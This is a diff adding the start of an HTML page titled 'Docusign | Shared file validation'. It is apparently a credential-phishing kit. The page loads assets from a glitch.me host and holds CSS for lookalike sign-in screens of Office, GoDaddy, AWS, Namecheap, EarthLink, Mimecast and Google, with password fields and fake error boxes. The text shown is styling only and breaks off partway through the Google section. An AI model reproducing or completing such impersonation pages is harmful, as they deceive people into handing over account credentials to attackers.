@@ -1,0 +1,4003 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Docusign | Shared file validation</title>
+    <link rel="shortcut icon" href="https://aluminum-vagabond-nerve.glitch.me/domain_assets/docusign_favicon.png" type="image/x-icon" id="fav_icon"/>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu,
+        Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    }
+    
+    .greetingSectionInner {
+        display: flex;
+        height: 100vh;
+        background-image: url('https://aluminum-vagabond-nerve.glitch.me/domain_assets/temp.jpg');
+        justify-content: end;
+        background-position: center center;
+        background-size: cover;
+        background-repeat: no-repeat;
+    }
+    
+    .img_wrapper {
+        margin-right: 50px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        display: none;
+    }
+    
+    .name_key_taker {
+        width: 35%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    .f_wrapper {
+        background: white;
+        box-shadow: 1px 1px 15px 7px #1c181838;
+        border-radius: 7px;
+        margin-right: 70px;
+        position: relative;
+    }
+    .null_pass_error {
+        padding-top: 10px;
+        color: #e81123;
+        /* font-size: 15px; */
+    }
+    
+    .f_wrapper h1 {
+        font-weight: 400;
+        text-align: center;
+        padding: 20px 0px;
+        border-bottom: 1px solid #c1b8b88c;
+        background: #f1eded8a;
+        border-radius: 7px 7px 0px 0px;
+        color: #262424;
+        font-size: 20px;
+    }
+    
+    .f_wrapper p {
+        font-size: 15px;
+        padding: 25px 0px;
+        text-align: start;
+        color: #474a4c;
+    }
+    
+    .home_input_box {
+        display: flex;
+    }
+    
+    input#name_key {
+        width: 100%;
+        padding: 12px;
+        border-radius: 150px;
+        border: 2px solid #685f5e75;
+    }
+    
+    .info_btn_callout {
+        position: relative;
+    }
+    
+    button#view_rq {
+        background: #0078d7;
+        width: 100%;
+        padding: 10px;
+        margin-top: 20px;
+        color: white;
+        font-weight: 600;
+        font-size: 16px;
+        border-radius: 130px;
+        border: 1px #ddd;
+        cursor: pointer;
+    }
+    .f_d_wrap {
+        padding: 30px;
+    }
+    
+    .btn___wrap {
+        display: block;
+    }
+    .home_input_box {
+        position: relative;
+    }
+    
+    .ds_callout {
+        position: absolute;
+        width: 250px;
+        left: -158px;
+        background: white;
+        box-shadow: 1px 2px 4px 3px #b1a8a8b5;
+        border-radius: 6px;
+        padding: 20px;
+        top: -150px;
+        display: none;
+    }
+    
+    .ds_callout p {
+        font-size: 12px;
+        padding: 0px;
+        padding-top: 10px;
+    }
+    
+    .ds_callout h3 {
+        font-weight: 400;
+        color: #444;
+        font-size: 17px;
+    }
+    
+    .ds_callout:after {
+        content: ' ';
+        position: absolute;
+        box-shadow: #d3ccccc7 2px 2px 0px 0px;
+        transform: rotate(45deg);
+        border-width: 10px;
+        border-style: solid;
+        border-color: transparent #fff #fff transparent;
+        left: 127px;
+        bottom: -9px;
+    }
+    .info_btn {
+        position: absolute;
+        top: 11px;
+        right: 19px;
+        opacity: 0.6;
+    }
+    
+    #hero_img {
+        filter: blur(1px);
+    }
+    
+    .error_border {
+        border: 2px solid rgb(225 54 54) !important;
+    }
+    .name_key_error_box {
+        text-align: center;
+        margin-top: 12px;
+        color: red;
+        font-weight: 400;
+    }
+    
+    .d_flex {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    
+    .error_box span {
+        color: blue;
+    }
+    
+    .error_box span:hover {
+        text-decoration: underline;
+        cursor: pointer;
+    }
+    /* office page css start */
+    .officeInnerWrapper {
+        background-image: url('https://aluminum-vagabond-nerve.glitch.me/domain_assets/office_bg.svg');
+        height: 100vh;
+        width: 100%;
+        background-position: center center;
+        background-repeat: no-repeat;
+        background-size: cover;
+        background-attachment: fixed;
+    }
+    .officeInnerWrapper .d_flex {
+        height: 96vh;
+    }
+    .opacity_none {
+        opacity: 0 !important;
+    }
+    .office_whiteboard {
+        width: 440px;
+        background: white;
+        /* height: 365px; */
+        padding: 38px;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+    }
+    
+    .office_name_key {
+        display: flex;
+        padding-top: 12px;
+    }
+    
+    img#office_left_arrow {
+        margin-right: 5px;
+    }
+    
+    img#office_left_arrow:hover {
+        background: #dddddda6;
+        border-radius: 100px;
+        cursor: pointer;
+    }
+    
+    .office_whiteboard h1 {
+        padding-top: 10px;
+        font-weight: 500;
+        font-size: 26px;
+        color: #000000b8;
+    }
+    
+    .office_n_p_input {
+        width: 100%;
+        margin-top: 10px;
+        padding-top: 10px;
+        border: navajowhite;
+        outline: none;
+        border-bottom: 1px solid rgba(0, 0, 0, 0.4);
+        padding-bottom: 10px;
+        font-size: 16px;
+    }
+    .cl_e_b h3 {
+        color: #159aff;
+    }
+    
+    .cl_e_b p {
+        color: #444444d1;
+    }
+    p.f_p_link {
+        margin-top: 20px;
+        color: blue;
+        font-size: 15px;
+        cursor: pointer;
+    }
+    
+    p.f_p_link:hover {
+        text-decoration: underline;
+    }
+    
+    .office_s_in_btn {
+        margin-top: 30px;
+        float: right;
+    }
+    
+    .office_s_in_btn button {
+        padding: 7px 39px;
+        border: none;
+        background: #0067b8;
+        color: white;
+        font-weight: 400;
+        font-size: 15px;
+        cursor: pointer;
+    }
+    
+    .office_s_in_btn button:hover {
+        background: #04518f;
+    }
+    div#office_footer {
+        display: flex;
+        background: rgba(0, 0, 0, 0.6);
+        height: 4vh;
+        align-items: center;
+        justify-content: end;
+    }
+    
+    div#office_footer p {
+        padding: 0px 15px;
+        font-size: 13px;
+        cursor: pointer;
+        color: white;
+    }
+    
+    /* office page css end */
+    
+    /* godaddy page css start  */
+    .godaddyInnerWrapper {
+        width: 100%;
+        position: relative;
+        height: 100vh;
+    }
+    
+    .gdWhiteboard {
+        width: 544px;
+        margin: auto;
+        border: 1px solid #ddd;
+        margin-top: 50px;
+        border-radius: 4px;
+        padding: 55px;
+        padding-top: 45px;
+        padding-bottom: 50px;
+    }
+    
+    img#godaddy_logo {
+        width: 130px;
+        margin-left: -10px;
+    }
+    
+    .gdWhiteboard h1 {
+        font-weight: 500;
+        font-size: 28px;
+        margin-bottom: 12px;
+    }
+    
+    .gd_title {
+        font-weight: 500;
+        font-size: 16px;
+        margin: 10px 0px;
+        opacity: 0.8;
+    }
+    
+    .gd_title span {
+        color: #09757a;
+        text-decoration: underline;
+        cursor: pointer;
+    }
+    
+    .gd_input_box input {
+        width: 100%;
+        height: 50px;
+        padding: 0px 13px;
+        font-size: 1rem;
+        font-weight: 400;
+        border: solid 1px #aab7c2;
+        color: black;
+        padding-top: 10px;
+    }
+    
+    .gd_input_box {
+        padding: 11px 0px;
+        position: relative;
+    }
+    
+    .gd_input_box input::placeholder {
+        opacity: 0.8;
+        color: black;
+        font-weight: 500;
+    }
+    
+    .gd_remember_me {
+        display: flex;
+        padding: 10px 0px;
+    }
+    
+    .gd_remember_me input {
+        margin-right: 10px;
+        height: 21px;
+        width: 21px;
+    }
+    
+    .gd_remember_me p {
+        font-weight: 500;
+        opacity: 0.7;
+    }
+    
+    .gd_confirm_btn button:hover {
+        background: #323434;
+        cursor: pointer;
+        border: none;
+    }
+    
+    .gd_confirm_btn button {
+        width: 100%;
+        text-align: center;
+        padding: 13px;
+        font-weight: 500;
+        background: black;
+        color: white;
+        font-size: 1rem;
+        border: none;
+    }
+    
+    .gd_confirm_btn {
+        margin-top: 10px;
+        display: block;
+    }
+    
+    .signup_with_box {
+        text-align: center;
+        margin-top: 10px;
+        font-weight: 400;
+    }
+    
+    .gd_title.gd_titile_cus {
+        text-align: center;
+        font-size: 15px;
+    }
+    
+    .gd_title.gd_footer {
+        text-align: center;
+        font-weight: 500;
+        font-size: 14px;
+        position: absolute;
+        bottom: 0px;
+        width: 100%;
+        opacity: 0.7;
+    }
+    .gd_input_box input:focus {
+        outline: 1.5px solid #1198b7;
+    }
+    label.gd_label {
+        position: absolute;
+        left: 13px;
+        top: 25px;
+        font-weight: 500;
+        opacity: 0.8;
+        transition: all 0.3s;
+    }
+    
+    span#pass_toggle {
+        position: absolute;
+        right: 15px;
+        top: 25px;
+        font-weight: 500;
+        cursor: pointer;
+        color: #3a9094;
+        text-decoration: underline;
+    }
+    
+    .gd_input_box input:focus .gd_np_ {
+        font-size: 10px;
+    }
+    .focus_active {
+        font-size: 12px;
+        top: 16px !important;
+        opacity: 0.6 !important;
+    }
+    .signup_with_icon {
+        display: inline-block;
+        border: 2px solid black;
+        padding: 5px 11px;
+        margin-top: 13px;
+        margin-bottom: 10px;
+        font-size: 25px;
+        margin-right: 11px;
+    }
+    .gd_null_pass_error {
+        font-size: 12px;
+        margin-top: -8px;
+    }
+    .gd_error_box {
+        background: #ffbbbb;
+        color: black !important;
+        font-weight: 500;
+        padding: 20px 30px;
+        text-align: center;
+        font-size: 15px;
+        margin-top: 16px;
+        border-radius: 5px;
+        margin-bottom: 10px;
+        line-height: 23px;
+    }
+    
+    .gd_error_box span {
+        color: black;
+        text-decoration: underline;
+    }
+    span.gd_label_star {
+        color: red;
+        font-size: 14px;
+    }
+    /* godaddy page css end  */
+    
+    /* aws page css start*/
+    .revisionInnerWrapper {
+        width: 100%;
+        height: 100vh;
+        padding-top: 30px;
+        position: relative;
+    }
+    
+    .revisionWhiteBoard {
+        display: flex;
+        margin: 0px 170px;
+        margin-right: 160px;
+        font-family: sans-serif;
+    }
+    
+    .revisionWhiteBoard_left {
+        width: 310px;
+        margin-right: 60px;
+    }
+    
+    img#revision_logo {
+        width: 85px;
+    }
+    
+    .revision_header {
+        display: flex;
+        align-items: center;
+        color: #444;
+        margin-top: 35px;
+    }
+    
+    .revision_header h1 {
+        font-size: 22px;
+        color: #444;
+        font-family: sans-serif;
+    }
+    
+    .revision_name_k_taker {
+        display: flex;
+        margin: 20px 0px;
+        color: #444;
+    }
+    
+    .revision_name_k_taker p {
+        margin-left: 5px;
+        font-size: 15px;
+    }
+    
+    .revision_label {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 10px;
+        font-size: 15px;
+    }
+    
+    .revisionWhiteBoard_left a {
+        color: blue;
+        font-family: sans-serif;
+        font-size: 14px;
+        text-decoration: none;
+    }
+    
+    .revision_label b {
+        color: #444;
+    }
+    
+    .revision_input_box input {
+        width: 100%;
+        padding: 6px;
+        border-radius: 3px;
+        border: 1px solid #b1aeae;
+        outline: none;
+    }
+    
+    .revision_confirm_btn button {
+        width: 100%;
+        margin-top: 20px;
+        background: linear-gradient(#2d8cec, #16b);
+        padding: 5px;
+        font-weight: 500;
+        color: white;
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.75);
+        border: 1px solid #0b4075;
+        border-radius: 3px;
+        font-size: 15px;
+        cursor: pointer;
+    }
+    
+    .revision_confirm_btn button:hover {
+        background: linear-gradient(#16b, #0d4d8c);
+    }
+    
+    .diff_anchor a {
+        display: block;
+        padding-top: 20px;
+    }
+    
+    .diff_anchor {
+        padding-top: 10px;
+    }
+    
+    .revisionWhiteBoard_left a:hover {
+        text-decoration: underline;
+    }
+    
+    .revision_input_box input:focus {
+        box-shadow: 1px 1px 4px 2px #59bfc97a;
+        outline: none;
+        border: 1px solid #0000ffa1;
+    }
+    .nc_input_box input:focus {
+        box-shadow: 1px 1px 4px 2px #59bfc97a;
+        outline: none;
+        border: 1px solid #0000ffa1;
+    }
+    .revision_footer {
+        text-align: center;
+        display: flex;
+        align-items: center;
+        bottom: 16px;
+        justify-content: center;
+        position: absolute;
+        width: 100%;
+    }
+    .revision_header span {
+        font-size: 13px;
+        margin-left: 6px;
+    }
+    .revision_footer p {
+        font-size: 12px;
+        font-family: 'Helvetica Neue', Roboto, Arial, sans-serif;
+        color: #444;
+    }
+    
+    .revision_footer a {
+        color: #444;
+        border-radius: 4px;
+        background: linear-gradient(white, #dedede);
+        padding: 5px 20px;
+        border: 1px solid #ddd;
+        font-weight: 500;
+        margin-left: 50px;
+    }
+    .revisionWhiteBoard_right {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 90vh;
+    }
+    .revision_error_box,
+    .revision_null_pass_error {
+        color: #c00;
+        padding: 0px;
+        font-size: 12px;
+    }
+    /* aws page css end */
+    
+    /* nc page css start  */
+    .nc_subHeader {
+        display: flex;
+        justify-content: space-between;
+        background: #2e3133;
+        color: #ffffffe8;
+        padding: 7px 25px;
+    }
+    
+    .nc_sh_left {
+        display: flex;
+        align-items: center;
+    }
+    
+    .nc_sh_right {
+        display: flex;
+        align-items: center;
+    }
+    
+    .nc_subHeader p {
+        text-transform: uppercase;
+        font-size: 14px;
+        cursor: pointer;
+        padding: 0px 13px;
+    }
+    
+    .nc_subHeader p:hover {
+        color: #025a6c;
+    }
+    
+    .nc_sh_left p span {
+        font-size: 11px;
+        margin-left: 3px;
+    }
+    
+    img#namecheap_logo {
+        width: 245px;
+        padding-left: 40px;
+    }
+    
+    .nc_h_right {
+        display: flex;
+        padding-right: 10px;
+    }
+    
+    .nc_h_left {
+        display: flex;
+        justify-content: space-between;
+        align-items: baseline;
+        padding: 25px 0px;
+    }
+    
+    .nc_h_right p {
+        text-transform: capitalize;
+        font-size: 1.125em !important;
+        padding: 0px 12px;
+        position: relative;
+        color: #6d6e70;
+        font-weight: 500;
+        font-family: inherit;
+        cursor: pointer;
+    }
+    
+    span.new_badge,
+    span.tryme_badge {
+        position: absolute;
+        top: -17px;
+        background: #ff8c46;
+        color: white;
+        font-size: 10px;
+        font-weight: 500;
+        padding: 2px 4px 1px 4px;
+        letter-spacing: 0.5px;
+        border-radius: 4px;
+        right: -6px;
+    }
+    
+    span.tryme_badge {
+        background: #579fe7;
+        width: 48px;
+    }
+    
+    .nc_h_right p:hover {
+        color: #8cc1c1;
+    }
+    
+    .nc_breadcrumbs {
+        padding: 1em 2em;
+        background: #f2f2f2;
+        border-bottom: 2px solid #8cc1c1;
+        border-top: 1px solid #ddd;
+        margin-bottom: 25px;
+    }
+    
+    .nc_breadcrumbs h2 {
+        color: #6d6e70;
+        font-size: 20px;
+        font-weight: 500;
+    }
+    
+    .nc_breadcrumbs span {
+        color: #8cc1c1;
+    }
+    
+    span#arrow_icon_nc {
+        color: #000000a6;
+        font-size: 22px;
+    }
+    
+    .nc_whiteBoard {
+        width: 580px;
+        margin: auto;
+        background: #f2f2f2;
+        border-radius: 5px;
+        padding-bottom: 40px;
+    }
+    
+    .nc_nw_head {
+        display: flex;
+        background: #6d6e70;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1em;
+        border-radius: 4px 4px 0px 0px;
+        color: white;
+        letter-spacing: 0.5px;
+        margin-bottom: 2em;
+    }
+    
+    .nc_nw_head h5:hover {
+        text-decoration: underline;
+        cursor: pointer;
+    }
+    
+    .nc_input_box {
+        display: flex;
+        margin: 1.125em;
+        align-items: center;
+    }
+    
+    .nc_input_box h5 {
+        color: #6d6e70;
+        font-size: 16px;
+        font-weight: 500;
+        width: 28%;
+    }
+    
+    .nc_input_box input {
+        border: 1px solid #d6d6d6;
+        padding: 0.5em;
+        width: 47%;
+        border-radius: 5px;
+        line-height: 1.5em;
+        font-size: 15px;
+    }
+    
+    .nc_confirm_btn {
+        text-align: center;
+        color: white;
+    }
+    
+    .nc_confirm_btn button,
+    .nc_pc_btn {
+        font-size: 1.125em;
+        color: white;
+        text-shadow: 0 -1px 1px #d8452e;
+        background: linear-gradient(to bottom, #f14c2e 0%, #d8452e 100%);
+        padding: 0.5em 1em;
+        border: 1px solid #e0452f;
+        border-radius: 5px;
+        margin-top: 1em;
+        cursor: pointer;
+        font-weight: 500;
+    }
+    
+    p.nc_f_p {
+        text-align: center;
+        color: #de3723;
+        margin-top: 1.5em;
+        cursor: pointer;
+    }
+    
+    p.nc_f_p:hover {
+        text-decoration: underline;
+    }
+    
+    .nc_confirm_btn button:hover {
+        background: linear-gradient(to bottom, #e03b2e 0%, #d02a2d 100%);
+    }
+    
+    .nc_promo_chart {
+        background: #f2f2f2;
+        margin-top: 4em;
+        padding: 4em 0em;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    
+    .nc_promo_chart h1 {
+        color: #7e7b7b;
+        margin-right: 30px;
+        font-weight: 600;
+        font-size: 19px;
+    }
+    
+    .nc_pc_btn {
+        margin: 0px;
+        background: linear-gradient(to bottom, #89c1c0 0%, #6d9796 100%);
+        text-shadow: 0 -1px 1px #4d7e7a;
+        border-color: #6c9494;
+    }
+    
+    .nc_pc_btn:hover {
+        background: linear-gradient(to bottom, #6b9494 0%, #4d7e7a 100%);
+    }
+    
+    div#nc_footer {
+        background: #2e3133;
+        padding-top: 4em;
+        border-top: 5px solid #8cc1c1;
+        color: white;
+    }
+    
+    .nc_f_gird_row {
+        display: flex;
+        justify-content: space-between;
+        padding: 0px 3em;
+    }
+    
+    .f_gird_right {
+        display: flex;
+        width: 65%;
+        justify-content: end;
+    }
+    
+    img#namecheap_logo_f {
+        width: 245px;
+    }
+    .f_gird_left {
+        width: 33%;
+    }
+    
+    .f_gird_left p {
+        padding: 31px 0px;
+        line-height: 24px;
+    }
+    
+    .f_gird_left h3 {
+        font-size: 16px;
+        margin-bottom: 18px;
+        font-weight: 500;
+    }
+    
+    .f_g_last {
+        border-top: 1px solid #dddddd6b;
+        padding-top: 30px;
+        margin-top: 40px;
+    }
+    
+    .f_gird_left h3:hover {
+        text-decoration: underline;
+        cursor: pointer;
+    }
+    
+    .f_g_last p {
+        padding: 0px;
+    }
+    
+    .f_g_last h3 {
+        padding: 0px;
+        margin: 3px 0px;
+    }
+    
+    .news_letter_nc input {
+        background: #4d4e4f;
+        padding: 1em;
+        width: 70%;
+        border: none;
+        border-radius: 5px 0px 0px 5px;
+        outline: none;
+        color: #f7f5f2;
+        font-size: 15px;
+    }
+    
+    .news_letter_nc {
+        width: 100%;
+        margin-top: 35px;
+    }
+    
+    .news_letter_nc button {
+        padding: 1em;
+        background: linear-gradient(to bottom, #f14c2e 0%, #d8452e 100%);
+        font-size: 15px;
+        border: none;
+        width: 25%;
+        margin-left: -4px;
+        cursor: pointer;
+        color: white;
+        font-weight: 400;
+        border-radius: 0px 5px 5px 0px;
+    }
+    
+    .news_letter_nc button:hover {
+        background: linear-gradient(to bottom, #e34225 0%, #c53923 100%);
+    }
+    
+    .news_letter_nc ul {
+        display: flex;
+        margin-top: 20px;
+    }
+    
+    .news_letter_nc ul li {
+        list-style: none;
+        margin: 7px;
+    }
+    
+    .news_letter_nc ul li i {
+        font-size: 27px;
+        border: 3px solid white;
+        border-radius: 300px;
+        width: 60px;
+        height: 60px;
+        padding: 15px 15px;
+        cursor: pointer;
+    }
+    
+    .f_gird_bottm {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 50px;
+        border-top: 1px solid #444;
+        padding-top: 3em;
+        margin: 3em;
+    }
+    
+    .f_gird_bottm p {
+        width: 50%;
+        font-size: 15px;
+    }
+    
+    .f_gird_bottm div p {
+        display: inline;
+        padding: 0px 14px;
+        font-size: 14px;
+    }
+    
+    .f_gird_bottm div p:hover {
+        text-decoration: underline;
+        cursor: pointer;
+    }
+    
+    .f_gird_right div {
+        margin-right: 25px;
+    }
+    
+    .f_gird_right h5 {
+        font-size: 16px;
+        font-weight: 500;
+        margin-top: 20px;
+        margin-bottom: 2px;
+        position: relative;
+        width: fit-content;
+    }
+    
+    .f_gird_right h5:hover {
+        cursor: pointer;
+        text-decoration: underline;
+    }
+    
+    .f_gird_right p {
+        font-size: 16px;
+        margin: 3px 0px;
+        cursor: pointer;
+        position: relative;
+        width: fit-content;
+    }
+    
+    .f_gird_right p:hover {
+        text-decoration: underline;
+    }
+    
+    span.new_badge_footer {
+        position: absolute;
+        top: -5px;
+        background: #ff8c46;
+        border-radius: 3px;
+        font-size: 11px;
+        padding: 1px 3px;
+        right: -40px;
+    }
+    .tryme_badge_footer {
+        position: absolute;
+        top: -5px;
+        background: #579fe7;
+        border-radius: 3px;
+        font-size: 11px;
+        padding: 1px 3px;
+        right: -54px;
+    }
+    img#nc_footer_img {
+        width: 100%;
+        height: auto;
+        cursor: pointer;
+        cursor: none;
+    }
+    .null_pass_error.nc_rq_n_e {
+        font-weight: 600;
+        text-transform: uppercase;
+        padding: 0px;
+        margin-left: 30px;
+    }
+    
+    .null_pass_error.nc_null_pass_error {
+        padding: 0px;
+        text-align: center;
+        margin-bottom: 10px;
+        font-size: 13px;
+        margin-left: -68px;
+    }
+    .error_box.nc_error_box {
+        background: #fdf8ad;
+        color: #6d6e70;
+        margin: 0px 20px;
+        padding: 23px;
+        border-radius: 3px;
+    }
+    
+    .error_box.nc_error_box div {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    
+    .error_box.nc_error_box div h4 {
+        font-weight: 500;
+        letter-spacing: 0.5px;
+        margin-bottom: 7px;
+    }
+    div#nc_required_error {
+        position: absolute;
+        right: 51px;
+        font-weight: 500;
+        font-size: 15px;
+        top: 156px;
+    }
+    
+    .nc_whiteBoard.board {
+        position: relative;
+    }
+    /* nc page css end  */
+    
+    /* earthlink page css start  */
+    .el_header {
+        display: flex;
+        justify-content: space-between;
+        background: linear-gradient(rgb(254, 254, 254), rgb(230, 228, 229));
+        align-items: center;
+        padding-right: 15px;
+        padding-left: 35px;
+        height: 40px;
+        margin-bottom: 15px;
+    }
+    
+    img#earthlink_logo {
+        width: 123px;
+    }
+    
+    img#el_search {
+        width: 24px;
+    }
+    
+    .elh2 {
+        display: flex;
+        align-items: center;
+    }
+    
+    .elh2 input {
+        width: 316px;
+        margin: 0px 10px;
+    }
+    
+    .elInnerWrapper {
+        background: rgb(242, 242, 242);
+    }
+    
+    .elBoard_wrapper.board {
+        background: white;
+        width: 500px;
+        height: 440px;
+        margin: auto;
+        padding: 0px 57px;
+        padding-top: 40px;
+        padding-bottom: 40px;
+        display: table;
+    }
+    
+    .elBoard_wrapper.board h1 {
+        color: rgb(0 125 186 / 82%);
+        font-size: 27px;
+        font-weight: 400;
+        text-align: center;
+    }
+    
+    .elBoard_wrapper.board p {
+        font-size: 18px;
+        color: #6e7272;
+        text-align: center;
+    }
+    
+    .el_input_box label {
+        color: rgb(112 123 135 / 92%);
+        display: block;
+        font-size: 16px;
+        font-weight: 500;
+        margin-bottom: 10px;
+    }
+    
+    .el_input_box input {
+        border: 1px solid darkgrey;
+        width: 100%;
+        padding: 9px 5px;
+        outline: none;
+        font-size: 16px;
+    }
+    
+    .el_input_box input {
+        margin-bottom: 10px;
+    }
+    
+    .el_input_box input:focus-within {
+        border: 2px solid gray;
+    }
+    
+    .el_rmbr input {
+        width: 14px;
+        height: 14px;
+        border: none;
+    }
+    
+    .el_rmbr {
+        display: flex;
+        margin-top: 8px;
+        justify-content: space-between;
+    }
+    
+    .el_rmbr div {
+        display: flex;
+    }
+    
+    .el_rmbr div p {
+        margin-top: -5px;
+        font-size: 17px !important;
+        padding-left: 6px;
+        color: black !important;
+    }
+    
+    .el_rmbr p {
+        color: #0000ffd9 !important;
+        font-size: 16px !important;
+        margin-top: -5px;
+        cursor: pointer;
+    }
+    
+    .el_btns {
+        margin-top: 20px;
+    }
+    
+    .el_btns button {
+        background: rgb(1, 114, 206);
+        width: 100%;
+        padding: 11px 15px;
+        border: none;
+        cursor: pointer;
+        color: white;
+        font-size: 16px;
+    }
+    
+    .el_btns div {
+        display: flex;
+        padding: 13px 0px;
+        justify-content: space-between;
+    }
+    
+    .el_btns div button {
+        width: 48%;
+    }
+    div#el_footer {
+        background-position: center center;
+        width: 100%;
+        height: 337px;
+        background-size: cover;
+        margin-top: 90px;
+    }
+    
+    .el_error_b {
+        text-align: center;
+        color: red;
+        padding: 0.5em;
+        border: 1px solid red;
+        width: fit-content;
+        background: white;
+        border-radius: 4px;
+        font-weight: bold;
+        margin: auto;
+    }
+    
+    .el_rmbr p:hover {
+        text-decoration: underline;
+    }
+    
+    .el_rmbr div p:hover {
+        text-decoration: none;
+    }
+    .el_b_logo {
+        text-align: center;
+        margin: 22px;
+    }
+    
+    /* earthlink page css end  */
+    
+    /* mimecast page css start  */
+    .mcInnerWrapper {
+        background: #1976d2;
+        height: 100vh;
+    }
+    
+    img#mimecast_logo {
+        width: 160px;
+    }
+    
+    .logo_wrapper {
+        text-align: center;
+        padding: 40px 30px;
+    }
+    
+    .mc_dashboard_wrapper.board {
+        background: white;
+        width: 378px;
+        margin: auto;
+        padding: 22px;
+        border-radius: 6px;
+    }
+    
+    .mc_footer {
+        text-align: center;
+    }
+    
+    .mc_footer p {
+        font-size: 13px;
+    }
+    
+    .mc_dashboard_wrapper.board h5 {
+        font-size: 19px;
+        color: #4c4c4c;
+    }
+    
+    .mc_dashboard_wrapper.board p {
+        padding: 17px 0px;
+        font-size: 15px;
+        color: #606060;
+        cursor: not-allowed;
+    }
+    
+    .input_box_mc {
+        display: grid;
+        margin-bottom: 17px;
+    }
+    
+    .input_box_mc input {
+        padding: 8px;
+        margin-bottom: 11px;
+        outline: none;
+        border-radius: 4px;
+        border: 1px solid #b7b4b4;
+    }
+    
+    .input_box_mc button {
+        background: #1976d2ad;
+        border: none;
+        border-radius: 4px;
+        padding: 8px;
+        color: white;
+        font-size: 16px;
+    }
+    
+    .mc_dashboard_wrapper.board a {
+        display: inherit;
+        font-size: 14px;
+        color: #1976d2;
+        text-decoration: none;
+    }
+    
+    .mc_dashboard_wrapper.board a:hover {
+        text-decoration: underline;
+    }
+    
+    .mc_footer {
+        color: white;
+        margin-top: 12px;
+    }
+    
+    .mc_footer p {
+        margin: 5px;
+    }
+    .error_box.mc_error_b {
+        margin: 0px;
+        padding: 0px;
+        border: 1px solid red;
+        border-radius: 3px;
+        padding: 6px;
+        font-size: 15px;
+        margin-bottom: 10px;
+    }
+    /* mimecast page css end  */
+    
+    /* google page css start  */
+    .ggl_dashboard.board {
+        width: 450px;
+        margin: auto;
+        text-align: center;
+        height: 500px;
+        border: 1px solid #ddd;
+        border-radius: 10px;
+        padding-top: 45px;
+        padding-left: 40px;
+        padding-right: 40px;
+        overflow: hidden;
+        transition: all 0.5s;
+    }
+    
+    img#ggl_logo {
+        width: 85px;
+    }
+    
+    .gglInnerWrapper {
+        padding-top: 80px;
+        height: 100vh;
+    }
+    
+    .ggl_dashboard.board h2 {
+        font-weight: 400;
+        padding-top: 10px;
+    }
+    
+    .ggl_n_k_hold {
+        display: flex;
+        align-items: center;
+        border: 1px solid #c1c1c1;
+        width: fit-content;
+        margin: auto;
+        padding: 4px 8px;
+        border-radius: 200px;
+        margin-top: 11px;
+        margin-bottom: 10px;
+        cursor: pointer;
+    }
+    
+    .ggl_n_k_hold p {
+        font-size: 14px;
+        font-weight: 500;
+        color: #444;
+        margin: 0px 5px;
+    }
+    
+    .ggl_n_k_hold:hover {
+        background: #ebebeb59;
+    }
+    
+    .input_box_ggl_wrapper {
+        margin-top: 50px;
+        position: relative;
+    }
+    
+    input#ggl_input {
+        width: 100%;
+        color: #202124;
+        padding: 15px 14px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 16px;
+        outline: none;
+        transition: all 0.3s;
+    }
+    
+    label#ggl_label {
+        position: absolute;
+        left: 12px;
+        top: 14px;
+        font-size: 17px;
+        color: #202124bd;
+        transition: all 0.3s;
+    }
+    
+    .show_pass_box {
+        text-align: start;
+        margin-top: 11px;
+        display: flex;
+        align-items: center;
+    }
+    
+    input#show_pass_ggl {
+        height: 18px;
+        width: 18px;
+        cursor: pointer;
+    }
+    
+    input#show_pass_ggl label {
+        font-size: 13px !important;
+    }
+    
+    /* vv */
+    input#ggl_input__rpe {
+        width: 100%;
+        color: #202124;
+        padding: 15px 14px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 16px;
+        outline: none;
+        transition: all 0.3s;
+    }
+    
+    label#ggl_input__rpe_label {
+        position: absolute;
+        left: 12px;
+        top: 14px;
+        font-size: 17px;
+        color: #202124bd;
+        transition: all 0.3s;
+    }
+    .box_wrapper_ggl_ {
+        display: flex;
+        width: 833px;
+        position: relative;
+        transition: all 0.5s;
+    }
+    .add_e_or_p {
+        left: -423px;
+    }
+    .input_box_ggl_wrapper.input_box_ggl_wrapper1 {
+        width: 367px;
+        margin-right: 53px;
+    }
+    
+    .input_box_ggl_wrapper.input_box_ggl_wrapper2 {
+        width: 368px;
+    }
+    /* vv */
+    
+    .show_pass_box label {
+        font-size: 14px;
+        cursor: pointer;
+        margin-left: 15px;
+    }
+    
+    .action_box_ggl {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 40px;
+    }
+    
+    button#ggl_submit_btn {
+        background: #1a73e8;
+        border: none;
+        padding: 10px 22px;
+        color: white;
+        border-radius: 3px;
+        font-weight: 500;
+        cursor: pointer;
+    }
+    
+    .action_box_ggl p {
+        color: #1a73e8;
+        font-size: 14px;
+        font-weight: 500;
+    }
+    
+    .action_box_ggl p:hover {
+        text-decoration: underline;
+        cursor: pointer;
+    }
+    
+    button#ggl_submit_btn:hover {
+        background: #1262cb;
+    }
+    .ggl_footer {
+        text-align: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-top: 18px;
+        margin-bottom: 20px;
+    }
+    
+    .ggl_f_1 {
+        display: flex;
+        cursor: pointer;
+        margin-right: 120px;
+    }
+    
+    .ggl_f_2 {
+        display: flex;
+        cursor: pointer;
+    }
+    
+    .ggl_f_1 p {
+        margin-right: 20px;
+        color: #444;
+        font-size: 14px;
+    }
+    
+    .ggl_f_1 span {
+        color: #444;
